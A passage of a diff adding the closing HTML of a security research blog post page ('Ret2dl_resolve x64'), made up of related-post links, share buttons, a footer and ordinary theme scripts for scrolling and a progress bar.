+                            style="background-image: url(/assets/images/sflogo.png)"
+                        
+                    >
+                        <header class="read-next-card-header">
+                            <small class="read-next-card-header-sitetitle">&mdash; Syst3m Failure &mdash;</small>
+                            
+                                <h3 class="read-next-card-header-title"><a href="/tag/research/">Research</a></h3>
+                            
+                        </header>
+                        <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
+</div>
+                        <div class="read-next-card-content">
+                            <ul>
+                                
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/sudo-heap-overflow">[CVE-2021-3156] Exploiting Sudo heap overflow on Debian 10</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/hotrod">[CUCTF 2020] Kernel Exploitation: Hotrod</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                  
+                                
+                            </ul>
+                        </div>
+                        <footer class="read-next-card-footer">
+                            <a href="/tag/research/">
+                                
+                                    See all 2 posts  →
+                                
+                            </a>
+                        </footer>
+                    </article>
+                
+            
+
+            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/hotrod">
+                <div class="post-card-image" style="background-image: url(/assets/images/hotrod/title.png)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/hotrod">
+                <header class="post-card-header">
+                    
+                        
+                            
+                               <span class="post-card-tags">Ctf</span>
+                            
+                        
+                            
+                                <span class="post-card-tags">Research</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">[CUCTF 2020] Kernel Exploitation: Hotrod</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p></p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/ghost.png" alt="D3v17" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/D3v17/">D3v17</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      1 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
+            
+
+        </div>
+    </div>
+</aside>
+
+<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
+<div class="floating-header">
+    <div class="floating-header-logo">
+        <a href="https://syst3mfailure.io/">
+            
+            <span>Syst3m Failure</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">&mdash;</span>
+    <div class="floating-header-title">Ret2dl_resolve x64</div>
+    <div class="floating-header-share">
+        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
+</svg>
+</div>
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Ret2dl_resolve+x64&amp;url=https://syst3mfailure.io/ret2dl_resolve"
+            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+
+        </a>
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://syst3mfailure.io/ret2dl_resolve"
+            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
+
+        </a>
+    </div>
+    <progress class="progress" value="0">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+
+
+<!-- /post -->
+
+<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->
+
+
+        <!-- Previous/next page links - displayed on every page -->
+
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://syst3mfailure.io/">Syst3m Failure</a> &copy; 2021</section>
+                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
+                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
+                    <a href="https://github.com/jekyller/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                    
+                    
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
